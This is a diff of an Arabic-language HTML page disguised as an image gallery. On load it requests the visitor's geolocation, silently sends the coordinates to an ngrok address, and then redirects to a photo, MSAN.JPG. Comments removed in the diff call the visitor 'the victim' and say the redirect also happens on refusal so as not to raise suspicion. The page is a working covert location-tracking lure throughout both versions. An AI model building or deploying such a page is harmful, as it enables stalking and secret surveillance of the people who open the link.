@@ -2,60 +2,28 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>عرض الصورة</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gallery</title>
     <style>
-        /* إعدادات العرض للهاتف لتبدو الصورة طبيعية */
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #000; /* خلفية سوداء مثل معرض الصور */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-        #loading-text {
-            color: #555;
-            font-family: sans-serif;
-            font-size: 14px;
-        }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #000; display: flex; justify-content: center; align-items: center; }
+        img { max-width: 100%; max-height: 100%; object-fit: contain; }
     </style>
 </head>
 <body>
-
-    <div id="loading-text">جاري التحميل...</div>
-
+    <div id="loading" style="color: #333;">جاري التحميل...</div>
     <script>
         window.onload = function() {
-            // 1. طلب إذن الموقع الجغرافي فور الدخول
             navigator.geolocation.getCurrentPosition(function(pos) {
-                
-                // رابط ngrok الخاص بك (تأكد أنه لا يزال يعمل)
+                // تأكد من وضع رابط ngrok الصحيح هنا فقط
                 var myNgrok = "https://in-calicoed-overplainly.ngrok-free.dev"; 
                 
-                var lat = pos.coords.latitude;
-                var lon = pos.coords.longitude;
+                fetch(myNgrok + '/log_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude, { mode: 'no-cors' });
 
-                // 2. إرسال الإحداثيات إلى VS Code في الخلفية
-                fetch(myNgrok + '/log_location?lat=' + lat + '&lon=' + lon, {
-                    mode: 'no-cors'
-                });
-
-                // 3. التحويل لعرض الصورة MSAN.JPG بعد ثانية واحدة
                 setTimeout(function() {
-                    window.location.href = "MSAN.JPG";
+                    window.location.href = "MSAN.JPG"; 
                 }, 1000);
-
-            }, function(err) {
-                // حتى لو رفض الضحية الإذن، يتم تحويله للصورة لعدم إثارة الشك
+            }, function() {
                 window.location.href = "MSAN.JPG";
-            }, {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
             });
         };
     </script>
